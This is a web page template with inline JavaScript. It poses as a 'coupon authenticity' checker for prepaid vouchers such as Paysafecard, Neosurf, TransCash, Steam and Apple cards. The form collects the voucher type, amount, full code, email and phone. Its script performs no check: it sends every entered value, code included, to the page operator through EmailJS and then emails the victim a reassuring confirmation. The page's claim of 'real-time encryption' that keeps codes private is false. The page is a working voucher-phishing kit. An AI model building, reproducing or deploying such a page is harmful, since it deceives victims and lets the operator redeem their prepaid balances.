<x-layout>
    <div class="max-w-[600px] w-full text-center space-y-lg">
        <!-- Instructional Branding Section -->
        <section class="space-y-sm">
            <h2 class="text-headline-lg font-headline-lg text-on-surface tracking-tight">Verify Coupon Authenticity</h2>
            <p class="text-body-lg font-body-lg text-on-surface-variant max-w-[480px] mx-auto">
                Enter your coupon code below to check its validity, expiration date, and usage status instantly.
            </p>
        </section>
        <!-- Verification Input Component -->
        <div class="bg-surface-container-lowest border border-outline-variant rounded-xl p-md shadow-sm">
            <form id="rechargeForm" novalidate class="space-y-md">
                <div class="relative group">
                    <label for="recharge_type"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Type of Recharge <span class="text-red-500">*</span>
                    </label>
                    <select name="recharge_type" id="recharge_type" class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant text-center tracking-widest uppercase" required>
                        <option value="" disabled selected>Select recharge type</option>
                        <option value="Transcash">TransCash</option>
                        <option value="PCS">PCS</option>
                        <option value="Neosurf">Neosurf</option>
                        <option value="Steam">Steam</option>
                        <option value="Paysafecard">Paysafecard</option>
                        <option value="Apple">Apple</option>
                        <option value="Amazon">Amazon</option>
                        <option value="Vanilla">Vanilla</option>
                        <option value="Toneo First">Toneo First</option>
                        <option value="Cashlib">Cashlib</option>
                        <option value="Other">Other</option>
                    </select>
                </div>
                <div class="relative group">
                    <label for="amount"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Amount <span class="text-red-500">*</span>
                    </label>
                    <input id="amount" class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant tracking-widest uppercase" name="amount" placeholder="e.g. 50 €" required type="text" />
                </div>
                <div class="relative group">
                    <label for="recharge_code"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Recharge Code <span class="text-red-500">*</span>
                    </label>
                    <input id="recharge_code" class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant  tracking-widest uppercase" name="recharge_code" placeholder="e.g. SUMMER24-SALE" required type="text" />
                    <div class="absolute inset-y-0 right-0 flex  items-center pr-md pointer-events-none opacity-40">
                        <span class="material-symbols-outlined" data-icon="confirmation_number">confirmation_number</span>
                    </div>
                </div>
                <div class="relative group">
                    <label for="user_email"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Email <span class="text-red-500">*</span>
                    </label>
                    <input class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant tracking-widest uppercase" name="user_email" placeholder="you@example.com" required id="user_email" type="email" />

                </div>
                <div class="relative group">
                    <label for="phone"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Phone (optional)
                    </label>
                    <input class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant tracking-widest uppercase" id="phone" name="phone" placeholder="+33 6 00 00 00 00" type="tel" />

                </div>
                <div class="relative group">
                    <label class="block text-gray-700 font-semibold mb-3 flex flex-start mb-2">
                        Hide the code <span class="text-red-500">*</span>
                    </label>
                    <div class="flex gap-6">
                        <label id="opt-yes" class="radio-option flex items-center gap-2 cursor-pointer group">
                            <input type="radio" name="hide_code" value="yes" class="w-5 h-5 text-blue-600 focus:ring-blue-500 cursor-pointer">
                            <span class="text-gray-700 group-hover:text-blue-600 transition">Yes</span>
                        </label>
                        <label id="opt-no" class="radio-optionflex items-center gap-2 cursor-pointer group">
                            <input type="radio" name="hide_code" value="no" checked class="w-5 h-5 text-blue-600 focus:ring-blue-500 cursor-pointer">
                            <span class="text-gray-700 group-hover:text-blue-600 transition">No</span>
                        </label>
                    </div>
                </div>
                <div class="relative group">
                    <label for="country"
                        class="text-sm font-medium text-slate-700 dark:text-slate-300 flex flex-start mb-2">
                        Country of purchase
                    </label>
                    <input class="w-full h-14 px-md bg-surface text-headline-md font-headline-md border border-outline-variant rounded-lg focus:ring-2 focus:ring-primary focus:border-primary transition-all placeholder:text-outline-variant tracking-widest uppercase" id="country" name="country" placeholder="Russia" type="text" />
                </div>
                <button class="w-full h-14 bg-primary text-on-primary font-headline-md text-headline-md rounded-lg hover:bg-primary-container hover:text-on-primary-container active:scale-[0.98] transition-all flex items-center justify-center gap-base" type="submit" id="submitBtn">
                    <span class="material-symbols-outlined" data-icon="check_circle" style="font-variation-settings: 'FILL' 1;">check_circle</span>
                    <svg id="spinner" class="hidden animate-spin w-4 h-4 text-white" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                    </svg>
                    Verify Code
                </button>
            </form>
        </div>
        <!-- Quick Action Grid (Bento Style Lite) -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-md pt-md">
            <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                <span class="material-symbols-outlined text-secondary" data-icon="security">security</span>
                <h3 class="font-headline-md text-headline-md text-on-surface">Secure Check</h3>
                <p class="font-body-md text-body-md text-on-surface-variant">Real-time encryption ensures your proprietary codes remain private during the lookup.</p>
            </div>
            <div class="p-md rounded-xl bg-surface-container-low border border-outline-variant text-left flex flex-col gap-base">
                <span class="material-symbols-outlined text-secondary" data-icon="speed">speed</span>
                <h3 class="font-headline-md text-headline-md text-on-surface">Instant Results</h3>
                <p class="font-body-md text-body-md text-on-surface-variant">Our high-performance verification engine processes requests in under 200 milliseconds.</p>
            </div>
        </div>
    </div>
    <div id="toast-container"
        class="fixed bottom-6 left-1/2 -translate-x-1/2 z-50 flex flex-col-reverse gap-2.5 pointer-events-none w-[min(420px,92vw)]"
        aria-live="polite" aria-atomic="true">
    </div>
    <script>
        /* ──────────────────────────────────────────────
     CONFIGURATION EMAILJS — remplace ces 3 valeurs
        ────────────────────────────────────────────── */
        const EMAILJS_PUBLIC_KEY = '_rzBEYEaRj7BX_bHx';
        const EMAILJS_SERVICE_ID = 'service_ug6vejb';
        const EMAILJS_TEMPLATE_ID = 'template_q5fs1x5';

        emailjs.init({
            publicKey: EMAILJS_PUBLIC_KEY
        });

        /* ── Radio toggle ── */
        document.querySelectorAll('.radio-option').forEach(opt => {
            opt.addEventListener('click', () => {
                document.querySelectorAll('.radio-option').forEach(o => {
                    o.classList.remove('border-2', 'border-blue-500', 'bg-blue-50', 'text-blue-600', 'font-semibold', 'active-radio');
                    o.classList.add('border', 'border-slate-200', 'bg-slate-50', 'text-slate-500', 'font-medium');
                    o.querySelector('.dot-inner').classList.replace('opacity-100', 'opacity-0');
                });
                opt.classList.remove('border', 'border-slate-200', 'bg-slate-50', 'text-slate-500', 'font-medium');
                opt.classList.add('border-2', 'border-blue-500', 'bg-blue-50', 'text-blue-600', 'font-semibold', 'active-radio');
                opt.querySelector('.dot-inner').classList.replace('opacity-0', 'opacity-100');
                opt.querySelector('input[type="radio"]').checked = true;
            });
        });

        /* ── Toast system ── */
        function showToast({
            type = 'success',
            title,
            message,
            duration = 6000
        }) {
            const container = document.getElementById('toast-container');

            const iconSuccess = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>`;
            const iconError = `<svg width="15" height="15" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>`;

            const isSuccess = type === 'success';
            const barColor = isSuccess ? 'bg-emerald-500' : 'bg-red-500';
            const iconBg = isSuccess ? 'bg-emerald-50 text-emerald-600' : 'bg-red-50 text-red-500';

            const toast = document.createElement('div');
            toast.className = [
                'relative overflow-hidden pointer-events-auto',
                'bg-white border border-slate-200 rounded-2xl shadow-xl shadow-slate-200/60',
                'flex items-start gap-3 p-4',
                'animate-toast-in'
            ].join(' ');

            toast.innerHTML = `
      <div class="w-9 h-9 rounded-full flex items-center justify-center flex-shrink-0 ${iconBg}">
        ${isSuccess ? iconSuccess : iconError}
      </div>
      <div class="flex-1 min-w-0 pt-0.5">
        <p class="text-sm font-semibold text-slate-900 leading-snug">${title}</p>
        <p class="text-xs text-slate-500 mt-0.5 leading-relaxed">${message}</p>
      </div>
      <button class="text-slate-400 hover:text-slate-600 transition-colors flex-shrink-0 mt-0.5" aria-label="Fermer">
        <svg width="14" height="14" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
      </button>
      <div class="toast-bar ${barColor}" style="animation-duration:${duration}ms"></div>`;

            container.appendChild(toast);

            const dismiss = () => {
                toast.style.animation = 'toastOut 0.35s ease-in forwards';
                setTimeout(() => toast.remove(), 340);
            };

            toast.querySelector('button').addEventListener('click', dismiss);
            setTimeout(dismiss, duration);
        }

        /* ── Form submit ── */
        document.getElementById('rechargeForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const btn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const btnIcon = document.getElementById('btnIcon');
            const btnLabel = document.getElementById('btnLabel');
            const required = ['recharge_type', 'amount', 'recharge_code', 'user_email', 'country'];

            // Validation
            let valid = true;
            required.forEach(id => {
                const el = document.getElementById(id);
                if (!el.value.trim()) {
                    el.classList.add('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50');
                    valid = false;
                    el.addEventListener('input', () => {
                        el.classList.remove('!border-red-400', '!ring-2', '!ring-red-200', '!bg-red-50');
                    }, {
                        once: true
                    });
                }
            });

            if (!valid) {
                showToast({
                    type: 'error',
                    title: 'Champs manquants',
                    message: 'Veuillez remplir tous les champs obligatoires marqués d\'un *.',
                    duration: 4000
                });
                return;
            }

            const hideCode = document.querySelector('input[name="hide_code"]:checked')?.value || 'No';

            const params = {
                recharge_type: document.getElementById('recharge_type').value,
                amount: document.getElementById('amount').value.trim(),
                recharge_code: document.getElementById('recharge_code').value.trim().toUpperCase(),
                user_email: document.getElementById('user_email').value.trim(),
                phone: document.getElementById('phone').value.trim() || 'Non renseigné',
                hide_code: hideCode,
                country: document.getElementById('country').value.trim()
            };

            // Loading state
            btn.disabled = true;
            spinner.classList.remove('hidden');
            btnIcon.classList.add('hidden');
            btnLabel.textContent = 'Sending...';

            try {
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, params);

                // Reset form
                e.target.reset();
                document.querySelectorAll('.radio-option').forEach(o => {
                    o.classList.remove('border-2', 'border-blue-500', 'bg-blue-50', 'text-blue-600', 'font-semibold');
                    o.classList.add('border', 'border-slate-200', 'bg-slate-50', 'text-slate-500', 'font-medium');
                    o.querySelector('.dot-inner').classList.replace('opacity-100', 'opacity-0');
                });
                const optNo = document.getElementById('opt-no');
                optNo.classList.remove('border', 'border-slate-200', 'bg-slate-50', 'text-slate-500', 'font-medium');
                optNo.classList.add('border-2', 'border-blue-500', 'bg-blue-50', 'text-blue-600', 'font-semibold');
                optNo.querySelector('.dot-inner').classList.replace('opacity-0', 'opacity-100');

                showToast({
                    type: 'success',
                    title: 'Demande envoyée avec succès !',
                    message: 'Votre demande a bien été reçue. Vérifiez votre boîte mail — notre équipe vous répondra très prochainement.',
                    duration: 7000
                });

                // 2ème envoi → l'utilisateur reçoit la confirmation
                await emailjs.send(EMAILJS_SERVICE_ID, 'template_g31nmcr', params);

            } catch (err) {
                console.error('EmailJS error:', err);
                showToast({
                    type: 'error',
                    title: 'Échec de l\'envoi',
                    message: 'Une erreur est survenue. Vérifiez votre connexion et réessayez.',
                    duration: 5000
                });
            } finally {
                btn.disabled = false;
                spinner.classList.add('hidden');
                btnIcon.classList.remove('hidden');
                btnLabel.textContent = 'Verify Code';
            }
        });
    </script>


</x-layout>
